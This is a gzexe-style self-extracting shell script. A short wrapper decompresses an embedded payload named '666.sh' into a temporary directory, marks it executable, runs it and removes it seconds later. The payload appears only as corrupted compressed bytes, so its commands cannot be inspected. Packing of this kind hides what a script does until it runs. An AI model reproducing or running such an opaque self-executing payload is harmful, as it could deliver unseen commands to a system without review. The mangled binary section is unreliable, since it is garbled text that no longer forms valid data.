#!/bin/sh
skip=44

tab='	'
nl='
'
IFS=" $tab$nl"

umask=`umask`
umask 77

gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -dt`
else
  gztmpdir=/tmp/gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }

gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `echo X | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  echo >&2 "Cannot decompress $0"
  (exit 127); res=127
fi; exit $res
�7��W666.sh Ŗ[oGǟ��bJ�X����-V\�r���(U�a����Y���JVDbH��,N���N�Xqvs1�%��	g/O|����z�i���yX���7�9s�堣|�!��q��L`����M���v�)&��~ʹ����?��)d�p���L8�pRRLr��L�xj���Qy���L|�%�Cgt;�O�7���.�7�����B�>��g״{O��=�����Q��<l� ���)����衪���fi��(�J%Na�N��bBd����JH�����A�=h��z�tG�6����-/k�lT�Ff{G�!�2�l<Z72-u�&^ъ۸�\�I[{���o��B޹��{i�D�i,n��и��,%�%cu�E�O%jէj�+�-�9�P�Z �N�=��gYue��軩�γ�o?�7��r�͛���A�@����E�6A�h�Y�Tͯ�,��ɵ�1b�V����-5+���JN�4��5�%���n�$O	�;w|�=�.B���G��!/j˛f�ovZ�C�1�i{��$�z�L嗙��Dє����v��/�^f�Q�3�<�>��T��7l�k73F����"ӄ��%U*�Aθ��:�Ro�ߞGs~�G��JvH�!�l�2$5!���PDo�0C3��O{;�<]����C�7u��V]&F�UxG#����W�7��&b�F���]Q��"�����k�w�E�[��t6���R^��h^j��/	B�Z��T��tQ�/Aq�DH;��[���.���$�EP\�>�s���X�x�9�G����'�̱>o���e\z�Oٯ��a��l��_|�/
:q�P�g>����b�NL״0�.0?�ŝ��ia�.0b�I��r!	f#̺v�s���q��P��^�iaF]`"�N
�,ȘHt�	������<sb�&帉�+�#��&�s?=��Ԥ�QY���"f^|�}H
  